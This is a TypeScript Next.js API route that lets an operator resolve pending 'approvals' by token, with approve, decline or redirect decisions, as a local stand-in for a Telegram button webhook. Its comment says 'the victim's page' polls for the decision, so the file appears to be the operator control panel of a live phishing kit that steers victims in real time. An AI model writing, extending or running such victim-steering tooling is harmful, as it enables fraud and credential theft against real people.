import { NextRequest, NextResponse } from "next/server"
import { updateApproval, type ApprovalDecision } from "@/lib/approval-gate"
import { approvalView } from "@/lib/approval-gate"

export const dynamic = "force-dynamic"

const VALID: ApprovalDecision[] = ["approve", "decline", "redirect"]

/**
 * Local / manual decision endpoint — the "hook" you use when testing from this
 * machine (Telegram can't reach localhost, so the real button-click webhook
 * won't fire). Hit it with a decision + token to resolve a pending approval:
 *
 *   /api/approval/resolve?token=<token>&decision=approve
 *   /api/approval/resolve?token=<token>&decision=decline
 *   /api/approval/resolve?token=<token>&decision=redirect
 *
 * The victim's page polls /api/approval and sees the decision on its next
 * tick. Safe to leave mounted: it can only affect a token that already exists
 * and is still pending.
 */
export async function GET(request: NextRequest) {
  const token = (request.nextUrl.searchParams.get("token") || "").trim()
  const decision = (request.nextUrl.searchParams.get("decision") || "").trim()
  if (!token || !VALID.includes(decision as ApprovalDecision)) {
    return NextResponse.json(
      { ok: false, error: "token and decision (approve|decline|redirect) required" },
      { status: 400 },
    )
  }
  const state = updateApproval(token, decision as ApprovalDecision, "local")
  if (!state) {
    return NextResponse.json(
      { ok: false, error: "token not found or already resolved" },
      { status: 404 },
    )
  }
  return NextResponse.json({ ok: true, view: approvalView(token) })
}

export async function POST(request: NextRequest) {
  const body = await request.json().catch(() => ({}))
  const token = String(body?.token ?? "").trim()
  const decision = String(body?.decision ?? "").trim()
  if (!token || !VALID.includes(decision as ApprovalDecision)) {
    return NextResponse.json(
      { ok: false, error: "token and decision (approve|decline|redirect) required" },
      { status: 400 },
    )
  }
  const state = updateApproval(token, decision as ApprovalDecision, "local")
  if (!state) {
    return NextResponse.json(
      { ok: false, error: "token not found or already resolved" },
      { status: 404 },
    )
  }
  return NextResponse.json({ ok: true, view: approvalView(token) })
}
